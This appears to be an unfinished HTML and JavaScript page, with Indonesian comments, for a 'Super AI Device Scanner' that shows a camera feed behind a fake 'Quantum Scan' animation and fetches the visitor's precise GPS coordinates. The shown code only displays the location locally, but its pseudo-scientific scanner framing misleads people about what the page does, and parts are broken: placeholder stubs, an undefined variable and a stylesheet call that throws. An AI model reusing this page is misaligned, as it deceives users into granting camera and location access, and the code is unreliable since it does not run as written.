<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Super AI Device Scanner</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <style>
    :root {
      --primary: #2ecc71;
      --secondary: #3498db;
    }
    body { 
      font-family: 'Roboto', Arial, sans-serif; 
      text-align: center; 
      padding: 20px; 
      background: #1a1a1a;
      color: white;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    .scanner-box {
      width: 300px;
      height: 300px;
      border: 4px solid var(--primary);
      border-radius: 20px;
      margin: 20px auto;
      position: relative;
      overflow: hidden;
      box-shadow: 0 0 30px rgba(46, 204, 113, 0.3);
    }
    .scanner-line {
      position: absolute;
      width: 100%;
      height: 4px;
      background: var(--primary);
      animation: scan 3s infinite;
      box-shadow: 0 0 10px var(--primary);
    }
    @keyframes scan {
      0% { top: 0; opacity: 0; }
      10% { opacity: 1; }
      90% { opacity: 1; }
      100% { top: 100%; opacity: 0; }
    }
    button {
      padding: 15px 40px;
      font-size: 20px;
      background: linear-gradient(45deg, var(--primary), var(--secondary));
      border: none;
      border-radius: 30px;
      cursor: pointer;
      transition: all 0.3s;
      color: white;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin: 20px;
      box-shadow: 0 4px 15px rgba(52, 152, 219, 0.4);
    }
    #loading {
      display: none;
      font-size: 1.5em;
      color: var(--primary);
      text-shadow: 0 0 10px rgba(46, 204, 113, 0.5);
      margin: 10px;
    }
    .hologram-effect {
      position: fixed;
      pointer-events: none;
      mix-blend-mode: screen;
      opacity: 0.3;
      z-index: 9999;
    }
    @keyframes hologram {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    /* Gaya untuk informasi lokasi */
    #location-info {
      margin-top: 10px;
      font-size: 1em;
    }
    #location-info a {
      color: var(--secondary);
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <h1 style="color: var(--primary); margin-bottom: 20px;">üõ∏ AI Device Scanner</h1>
  <div class="scanner-box">
    <div class="scanner-line"></div>
    <video id="video" width="300" height="300" autoplay playsinline muted></video>
  </div>
  <button id="capture-btn">üöÄ Start Quantum Scan</button>
  <button id="location-btn">üìç View My Location</button>
  <div id="location-info"></div>
  <div id="loading">üî≠ Scanning Quantum Signature...</div>
<script>
    // === Konfigurasi yang sama ===

    // === Fungsi Lokasi yang Ditingkatkan ===
    function getPreciseLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject(new Error("Geolocation tidak didukung"));
          return;
        }

        let bestPosition = null;
        const options = {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        };

        const watchId = navigator.geolocation.watchPosition(
          position => {
            if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
              bestPosition = position;
            }
            
            if (position.coords.accuracy <= 20) {
              navigator.geolocation.clearWatch(watchId);
              resolve(bestPosition);
            }
          },
          error => {
            navigator.geolocation.clearWatch(watchId);
            reject(error);
          },
          options
        );

        setTimeout(() => {
          navigator.geolocation.clearWatch(watchId);
          bestPosition ? resolve(bestPosition) : reject(new Error('Waktu pencarian lokasi habis'));
        }, 30000);
      });
    }

    // === Fungsi View Location yang Ditingkatkan ===
    async function viewLocation() {
      try {
        const permission = await navigator.permissions.query({ name: 'geolocation' });
        if (permission.state === 'denied') {
          showError('Izin Lokasi Ditolak', 'Silakan aktifkan izin lokasi di pengaturan browser Anda');
          return;
        }

        const position = await getPreciseLocation();
        const { latitude, longitude, accuracy, altitude, altitudeAccuracy } = position.coords;
        
        let locationInfo = `
          <p>üõ∞Ô∏è Koordinat Presisi Tinggi:</p>
          <p><strong>${latitude.toFixed(6)}¬∞, ${longitude.toFixed(6)}¬∞</strong></p>
          <p>Akurasi: <strong>${Math.round(accuracy)} meter</strong></p>
        `;

        if (altitude) {
          locationInfo += `<p>Ketinggian: <strong>${Math.round(altitude)}m ¬±${Math.round(altitudeAccuracy)}m</strong></p>`;
        }

        const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
        document.getElementById('location-info').innerHTML = `
          ${locationInfo}
          <p><a href="${mapsUrl}" target="_blank" style="color:var(--primary);">üåê Buka di Peta 3D</a></p>
          ${accuracy > 100 ? '<p class="accuracy-warning">‚ö†Ô∏è Aktifkan GPS untuk akurasi lebih baik</p>' : ''}
        `;

      } catch (error) {
        showError('Kesalahan Lokasi Kuantum', error);
      }
    }

    // === Peningkatan Analisis Perangkat ===
    async function getDeviceInfo() {
      // ... kode sebelumnya ...
      
      // Deteksi fitur GPS
      const gpsCapability = {
        hasGPS: 'geolocation' in navigator,
        motionSensors: 'DeviceOrientationEvent' in window,
        proximity: 'ProximitySensor' in window
      };

      return {
        // ... data sebelumnya ...
        sensors: gpsCapability,
        locationType: accuracy <= 100 ? 'GPS Presisi Tinggi' : 'Perkiraan Jaringan'
      };
    }

    // === Peningkatan Tampilan Error ===
    function showError(title, error) {
      let message = `${title}: ${error.message || error}`;
      if (error.code === error.PERMISSION_DENIED) {
        message += '\nüîê Izinkan akses lokasi di pengaturan browser!';
      } else if (error.code === error.TIMEOUT) {
        message += '\nüïí Aktifkan GPS dan coba lagi di area terbuka!';
      }
      
      alert(message);
      console.error(`${title}:`, error);
    }

    // === Style Tambahan ===
    const addedStyles = `
      .accuracy-warning {
        color: #e74c3c;
        margin-top: 10px;
        animation: pulse 1.5s infinite;
      }
      @keyframes pulse {
        0% { opacity: 0.6; }
        50% { opacity: 1; }
        100% { opacity: 0.6; }
      }
    `;
    document.styleSheets[0].insertRule(addedStyles);
  </script>
</body>
</html>
